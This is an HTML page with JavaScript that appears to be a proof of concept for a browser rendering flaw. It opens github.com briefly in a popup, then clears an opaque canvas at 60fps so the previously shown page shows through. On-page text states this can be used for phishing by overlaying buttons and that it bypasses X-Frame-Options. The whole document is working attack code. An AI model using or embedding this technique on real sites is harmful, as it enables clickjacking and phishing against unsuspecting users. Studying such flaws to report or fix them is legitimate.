<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <style>
        body,
        canvas {
            position: absolute;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            margin: 0;

        }
        canvas{
            top:3em
        }
        span{
            position:absolute;
            left:1%;
            top:1%;
        }
        canvas {
            z-index: 1;
            display:none;
        }
    </style>
    <canvas></canvas>
    <span></span>
    <script>
        var canvas = document.querySelector('canvas')
        ctx = canvas.getContext('2d', { alpha: false })
        canvas.width = document.body.clientWidth
        canvas.height = document.body.clientHeight
        var drawing = false
        ctx.font = '120px Arial'
        document.addEventListener('visibilitychange', e => {
            if (document.visibilityState !== 'visible') {
                if (!drawing) {
                    setInterval(function () {
                        //must clearrect a canvas with alpha set to false in the getContext at a high rate (this is 60fps)
                        //the website isn't drawn to the canvas, but the current tab is made transparent so that the previous page is shown.
                        //by quickly opening and closing a tab, I can choose the previous page shown. 
                        ctx.clearRect(0, 0, canvas.width, canvas.height)
                    }, 1000 / 60)
                    canvas.style.display = 'inline-block'
                    document.querySelector('span').textContent = "This isn't able to read the webpage but can be used for phishing attacks by placing buttons on top of areas where buttons are known to be. Functionally the same as an iframe you can't interact with, but this bypasses the X-Frames-Options header."
                    drawing = true
                }
            }
        })
        //temporarily open tab
        var w = window.open('http://github.com')
        setTimeout(function(){
            w.close()
            //doesn't work for certain websites, but the window.open still does and the content is still mirrored
        },100)
    </script>
</body>

</html>